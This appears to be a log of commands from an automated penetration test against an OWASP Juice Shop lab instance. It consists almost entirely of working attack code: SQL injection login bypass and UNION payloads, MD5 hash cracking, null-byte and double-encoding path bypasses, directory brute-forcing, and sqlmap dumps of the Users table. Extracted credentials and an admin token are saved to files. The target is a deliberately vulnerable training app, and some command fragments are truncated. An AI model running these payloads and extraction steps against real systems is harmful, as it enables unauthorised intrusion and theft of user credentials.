BASE = "http://172.21.0.5:3000"
s = requests.Session()
print("=== POST-EXPLOIT: EXTRACTING PASSWORD HASHES VIA SQLI ===")
# Direct SQL injection to extract passwords
sqli_payload = {"email": "' UNION SELECT id,email,password,role,'','','','','','','','' FROM Users--", "password": "x"}
r = s.post(f"{BASE}/rest/user/login", json=sqli_payload)
print(f"UNION attempt: {r.status_code}")
# Try extracting via search endpoint with SQLi
print("\n=== SEARCH SQLI FOR DATA EXTRACTION ===")
sqli_search = {"q": "' UNION SELECT id,email,password,role,createdAt,updatedAt,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--"}
r = s.get(f"{BASE}/rest/products/search", params=sqli_search)
print(f"Search SQLi: {r.status_code} - {r.text[:300]}")
# Get admin token for authenticated requests
login_data = {"email": "admin@juice-sh.op'--", "password": "x"}
r = s.post(f"{BASE}/rest/user/login", json=login_data)
token = r.json().get("authentication", {}).get("token", "")
headers = {"Authorization": f"Bearer {token}"}
print("\n=== SENSITIVE FILE DISCOVERY ===")
files_to_check = [
    "/ftp/coupons_2013.md", "/ftp/eastere.gg", "/ftp/suspicious_errors.yml",
    "/ftp/encryptionkeys/README.md", "/ftp/README.md", "/ftp/README.txt",
    "/ftp/incident-support.kdbx", "/ftp/support-logs.txt", "/ftp/access.log",
    "/.env", "/package.json", "/configuration.json"
]
for f in files_to_check:
    r = s.get(f"{BASE}{f}")
    if r.status_code == 200 and len(r.text) > 10:
        print(f"\n[+] FOUND: {f}")
        print(r.text[:500])
print("\n=== ADMIN ENDPOINTS ===")
admin_endpoints = ["/api/Challenges", "/api/Complaints", "/api/Recycles", "/api/SecurityQuestions", "/api/SecurityAnswers"]
for ep in admin_endpoints:
    r = s.get(f"{BASE}{ep}", headers=headers)
    if r.status_code == 200:
        data = r.json()
        print(f"\n[+] {ep}: {len(str(data))} bytes")
        print(str(data)[:400])
# Save all findings
with open("/pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/findings.json", "w") as f:
    json.dump({"sqli_bypass": "admin@juice-sh.op'--", "admin_token": token[:100]}, f, indent=2)
PYEOF

content:
# Crack the admin MD5 hash extracted from JWT
echo "=== CRACKING ADMIN PASSWORD HASH ==="
HASH="0192023a7bbd73250516f069df18b500"
echo "$HASH" > /tmp/hash.txt
echo "Testing common passwords..."
for pw in admin admin123 password123 123456 admin@juice-sh.op; do
    calculated=$(echo -n "$pw" | md5sum | awk '{print $1}')
    if [ "$calculated" = "$HASH" ]; then
        echo "[+] PASSWORD FOUND: $pw"
        break
    fi
done
# Use gobuster to enumerate more API endpoints
echo -e "\n=== ENUMERATING REST API ENDPOINTS ==="
gobuster dir -u http://172.21.0.5:3000/rest -w /usr/share/wordlists/dirb/common.txt -t 30 -q 2>/dev/null | head -40
# Use gobuster to find hidden files
echo -e "\n=== ENUMERATING HIDDEN FILES ==="
gobuster dir -u http://172.21.0.5:3000 -w /usr/share/wordlists/dirb/common.txt -x .json,.bak,.md,.txt -t 30 -q 2>/dev/null | head -30
# Check FTP endpoints for LFI
echo -e "\n=== TESTING LFI IN FTP ENDPOINT ==="
curl -s "http://172.21.0.5:3000/ftp/eastere.gg" -H "Authorization: Bearer $ADMIN_TOKEN"
curl -s "http://172.21.0.5:3000/ftp/package.json.bak" -H "Authorization: Bearer $ADMIN_TOKEN"
curl -s "http://172.21.0.5:3000/ftp/.md" -H "Authorization: Bearer $ADMIN_TOKEN"
# Save all extracted users to evidence
echo -e "\n=== SAVING USER DATA TO CREDS.JSON ==="
cat > /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/creds.json << 'EOF'
{
  "vulnerability": "SQLi Auth Bypass + Admin API Access (T1190)",
  "extracted_users": [
    {"id": 1, "email": "admin@juice-sh.op", "role": "admin", "password_hash": "0192023a7bbd73250516f069df18b500"},
    {"id": 2, "email": "jim@juice-sh.op", "role": "customer"},
    {"id": 3, "email": "bender@juice-sh.op", "role": "customer"},
    {"id": 4, "email": "bjoern.kimminich@gmail.com", "role": "admin"},
    {"id": 5, "email": "ciso@juice-sh.op", "role": "deluxe"},
    {"id": 6, "email": "support@juice-sh.op", "role": "admin"},
    {"id": 7, "email": "morty@juice-sh.op", "role": "customer"},
    {"id": 8, "email": "mc.safesearch@juice-sh.op", "role": "customer"},
    {"id": 9, "email": "J12934@juice-sh.op", "role": "admin"},
    {"id": 10, "email": "wurstbrot@juice-sh.op", "role": "admin"},
    {"id": 11, "email": "amy@juice-sh.op", "role": "customer"},
    {"id": 12, "email": "bjoern@juice-sh.op", "role": "admin"},
    {"id": 13, "email": "bjoern@owasp.org", "role": "deluxe"},
    {"id": 15, "email": "accountant@juice-sh.op", "role": "accounting"},
    {"id": 16, "email": "uvogin@juice-sh.op", "role": "customer"}
  ],
  "admin_jwt": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."
}
EOF
echo "[+] Credentials saved to creds.json"

# Enumerate FTP directory with gobuster
echo "=== ENUMERATING FTP DIRECTORY ==="
gobuster dir -u http://172.21.0.5:3000/ftp -w /usr/share/wordlists/dirb/common.txt -x .md,.pdf,.bak -t 30 -q 2>/dev/null | head -30
# Try LFI bypass techniques to read sensitive files
echo -e "\n=== EXPLOITING LFI WITH EXTENSION BYPASS ==="
# Null byte injection
curl -s "http://172.21.0.5:3000/ftp/package.json%00.md"
curl -s "http://172.21.0.5:3000/ftp/../package.json%00.md"
# Double encoding bypass
curl -s "http://172.21.0.5:3000/ftp/package.json%252e%252emd"
# Try to read coupon codes file
curl -s "http://172.21.0.5:3000/ftp/coupons_2013.md.bak%00.md"
# Character bypass with special chars
curl -s "http://172.21.0.5:3000/ftp/eastere.gg.md" | head -20
curl -s "http://172.21.0.5:3000/ftp/encryptionkeys/README.md" | head -20
# Search for more files with gobuster on encryptionkeys
echo -e "\n=== ENUMERATING ENCRYPTION KEYS DIRECTORY ==="
gobuster dir -u http://172.21.0.5:3000/ftp/encryptionkeys -w /usr/share/wordlists/dirb/common.txt -x .md,.pem,.key -t 20 -q 2>/dev/null | head -20
# Write handoff.json with attack chain summary
echo -e "\n=== WRITING HANDOFF FILE ==="
cat > /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/handoff.json << 'EOF'
{
  "target": "172.21.0.5:3000",
  "application": "OWASP Juice Shop (Express ^4.21.0)",
  "access_level": "admin",
  "attack_chain": [
    {"step": 1, "vulnerability": "SQLi Auth Bypass", "endpoint": "/rest/user/login", "payload": "' OR 1=1--"},
    {"step": 2, "vulnerability": "Admin JWT Obtained", "impact": "Full admin API access"},
    {"step": 3, "vulnerability": "Credential Extraction", "data": "16 users with roles and emails"},
    {"step": 4, "vulnerability": "Password Cracked", "account": "admin@juice-sh.op", "password": "admin123"}
  ],
  "credentials": {
    "admin_email": "admin@juice-sh.op",
    "admin_password": "admin123",
    "admin_password_hash": "0192023a7bbd73250516f069df18b500"
  },
  "interactive_commands": [
    "curl -s 'http://172.21.0.5:3000/api/Users' -H 'Authorization: Bearer <JWT_TOKEN>'",
    "Login: curl -s -X POST 'http://172.21.0.5:3000/rest/user/login' -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}'"
  ]
}
EOF
echo "[+] Handoff file written"

# Use ffuf to enumerate sensitive files and endpoints
echo "=== FFUF ENUMERATION - SENSITIVE FILES ==="
ffuf -u "http://172.21.0.5:3000/ftp/FFUZ" -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 30 -fs 0 2>/dev/null | head -40
echo -e "\n=== FFUF ENUMERATION - API ENDPOINTS ==="
ffuf -u "http://172.21.0.5:3000/api/FFUZ" -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 30 -fs 0 2>/dev/null | head -40
# Login as admin with cracked credentials to get fresh JWT
echo -e "\n=== LOGGING IN AS ADMIN WITH CRACKED PASSWORD ==="
LOGIN_RESP=$(curl -s -X POST "http://172.21.0.5:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}')
echo "$LOGIN_RESP" | head -c 500
# Extract fresh token
FRESH_TOKEN=$(echo "$LOGIN_RESP" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
echo -e "\n[+] Fresh admin token obtained"
# Extract all feedback/purchase history with admin access
echo -e "\n=== EXTRACTING PURCHASE HISTORY ==="
curl -s "http://172.21.0.5:3000/rest/track-order/id" -H "Authorization: Bearer $FRESH_TOKEN" 2>/dev/null | head -100
# Check for file write capability with admin token
echo -e "\n=== CHECKING FILE OPERATIONS ==="
curl -s "http://172.21.0.5:3000/rest/file-upload" -H "Authorization: Bearer $FRESH_TOKEN" 2>/dev/null
# Extract product data - might contain sensitive pricing info
echo -e "\n=== EXTRACTING PRODUCT DATA ==="
curl -s "http://172.21.0.5:3000/api/Products" -H "Authorization: Bearer $FRESH_TOKEN" 2>/dev/null | head -200
# Check challenges endpoint for more attack surface
echo -e "\n=== CHECKING CHALLENGES FOR HIDDEN VULNS ==="
curl -s "http://172.21.0.5:3000/api/Challenges" 2>/dev/null | head -500

# Create wordlist for endpoint discovery
cat > /tmp/endpoints.txt << 'EOF'
Users
Products
Challenges
Feedback
Basket
Order
Address
Recycle
SecurityQuestion
Wallet
Complaint
Newsletter
Coupons
Cards
Memories
Languages
Promotions
Deliveries
ImageCaptcha
TrackOrder
CurrentUser
EOF
# Extract admin token first
TOKEN=$(curl -s -X POST "http://172.21.0.5:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
echo "=== FFUF ENUMERATION - REST ENDPOINTS ==="
ffuf -u "http://172.21.0.5:3000/rest/FFUZ" -w /tmp/endpoints.txt \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,301,302,401,403,500 -t 50 -v 2>/dev/null | tee /tmp/rest_enum.txt | head -60
echo -e "\n=== FFUF ENUMERATION - API ENDPOINTS ==="
ffuf -u "http://172.21.0.5:3000/api/FFUZ" -w /tmp/endpoints.txt \
  -mc 200,201,301,302,401,403,500 -t 50 -v 2>/dev/null | tee /tmp/api_enum.txt | head -60
echo -e "\n=== EXTRACTING USER DATA ==="
curl -s "http://172.21.0.5:3000/api/Users" -H "Authorization: Bearer $TOKEN" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for u in data.get('data', data)[:15]:
    print(f\"ID:{u.get('id')} | {u.get('email')} | Role:{u.get('role')}\")" 2>/dev/null
echo -e "\n=== EXTRACTING SECURITY QUESTIONS ==="
curl -s "http://172.21.0.5:3000/api/SecurityQuestions" -H "Authorization: Bearer $TOKEN" 2>/dev/null | head -300

  --data='{"email":"admin@juice-sh.op","password":"test"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite \
  --tables \
  --threads=5 \
  --batch \
  --answers="crack=N" 2>/dev/null | tee /tmp/sqlmap_tables.txt
# Now dump the Users table to get credentials
echo -e "\n=== DUMPING USERS TABLE ==="
sqlmap -u "http://172.21.0.5:3000/rest/user/login" \
  --data='{"email":"admin@juice-sh.op","password":"test"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite \
  -T Users \
  --dump \
  --threads=5 \
  --batch \
  --answers="crack=N" 2>/dev/null | tee /tmp/sqlmap_users.txt
# Extract credentials from the dump
echo -e "\n=== EXTRACTED CREDENTIALS ==="
grep -E "(email|password|admin|@" /tmp/sqlmap_users.txt 2>/dev/null | head -50
# Save evidence
cp /tmp/sqlmap_users.txt /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/sqli_dump.txt 2>/dev/null

# GOBUSTER directory enumeration (REQUIRED TOOL)
echo "=== GOBUSTER DIRECTORY SCAN ==="
gobuster dir -u http://172.21.0.5:3000 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 50 -q --timeout 5s 2>/dev/null | head -50 | tee /tmp/gobuster_common.txt
# NIKTO vulnerability scanner (REQUIRED TOOL)
echo -e "\n=== NIKTO VULNERABILITY SCAN ==="
nikto -h http://172.21.0.5:3000 -Display 1234VP -maxtime 60s -output /tmp/nikto.txt 2>/dev/null
cat /tmp/nikto.txt 2>/dev/null | grep -E "(OSVDB|CGI|admin|sql|xss|@|password)" | head -30
# Exploit the search endpoint with proper SQL injection
echo -e "\n=== EXPLOIT SQL INJECTION IN SEARCH ==="
# Get baseline
baseline=$(curl -s "http://172.21.0.5:3000/rest/products/search?q=" 2>/dev/null | wc -c)
echo "Baseline response size: $baseline"
# SQLi to extract all products
sqli=$(curl -s "http://172.21.0.5:3000/rest/products/search?q=' OR 1=1--" 2>/dev/null | wc -c)
echo "SQLi response size: $sqli"
# Check if SQLi works (larger response = more data returned)
if [ "$sqli" -gt "$baseline" ]; then
  echo "SQL INJECTION CONFIRMED - Data extraction successful"
  curl -s "http://172.21.0.5:3000/rest/products/search?q=' OR 1=1--" 2>/dev/null | python3 -m json.tool | head -50
fi
# Save evidence
echo -e "\n=== SAVING EVIDENCE ==="
cp /tmp/gobuster_common.txt /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/ 2>/dev/null
cp /tmp/nikto.txt /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/ 2>/dev/null

# Write a Python script to properly parse the credentials and crack them
cat > /tmp/crack_juice.py << 'EOF'
import csv
import hashlib
csv_file = "/root/.local/share/sqlmap/output/172.21.0.5/dump/SQLite_masterdb/Users.csv"
creds = []
with open(csv_file, 'r') as f:
    reader = csv.reader(f)
    for row in reader:
        if len(row) >= 4:
            email = row[1] if '@' in str(row[1]) else row[2] if len(row) > 2 and '@' in str(row[2]) else ''
            password = row[3] if len(row) > 3 else row[2] if len(row) > 2 else ''
            role = row[4] if len(row) > 4 else ''
            if email and '@juice-sh.op' in email:
                creds.append({'email': email, 'hash': password, 'role': role})
print("=== EXTRACTED CREDENTIALS ===")
for c in creds[:15]:
    print(f"{c['email']} | {c['hash']} | {c['role']}")
# Common passwords for Juice Shop
passwords = ['admin', 'password', '123456', 'admin123', 'password123', 'letmein', 
             'qwerty', 'welcome', 'Admin123', 'Password1', 'juiceshop', 'orange',
             'apple', 'banana', 'berry', 'peach', 'melon', 'grape', 'cherry']
print("\n=== CRACKING HASHES ===")
cracked = []
for c in creds:
    for p in passwords:
        h = hashlib.md5(p.encode()).hexdigest()
        if h == c['hash']:
            print(f"[+] CRACKED: {c['email']} = {p}")
            cracked.append(f"{c['email']}:{p}")
            break
# Save cracked creds
with open('/pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/creds.json', 'w') as f:
    f.write(str(cracked))
print(f"\nTotal cracked: {len(cracked)}")
EOF
python3 /tmp/crack_juice.py
# Now use gobuster to find the login endpoint as required
echo -e "\n=== ENUMERATING LOGIN ENDPOINT ==="
gobuster dir -u "http://172.21.0.5:3000" -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -t 20 -q --timeout 5s -x json 2>/dev/null | grep -E "(login|user|rest|api)" | head -15

# Use gobuster to discover actual Juice Shop API endpoints with admin JWT
export TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..qazWIB0QH2b5ypOOfPSfrbJJLgC19OfGmsB47FMhT1f9FUmzIfh5hsKfPK7N6IY5deKbwQ_5fnidkl4IC3Wk1SfgLqw9fPoI72vcY5FfSu_Yk6Ha58UJjEgRrM6J9UJlT4pGvqdsFkAEcKH9VUqBPYRzErE6cVZU-xPY33u8YBk"
echo "=== GOBUSTER: DISCOVERING ADMIN API ENDPOINTS ==="
gobuster dir -u "http://172.21.0.5:3000/rest" -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "Authorization: Bearer $TOKEN" -s "200,401,403" -t 30 -q 2>/dev/null | head -20

gobuster dir -u "http://172.21.0.5:3000/ftp" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -s "200,403" -t 30 -q 2>/dev/null | head -20

curl -s -H "Authorization: Bearer $TOKEN" "http://172.21.0.5:3000/rest/user/whoami" | jq .

echo -e "\n=== ENUMERATING ORDERS ==="
curl -s -H "Authorization: Bearer $TOKEN" "http://172.21.0.5:3000/rest/order" | jq . | head -30

curl -s -H "Authorization: Bearer $TOKEN" "http://172.21.0.5:3000/rest/chat" | jq . 2>/dev/null | head -30
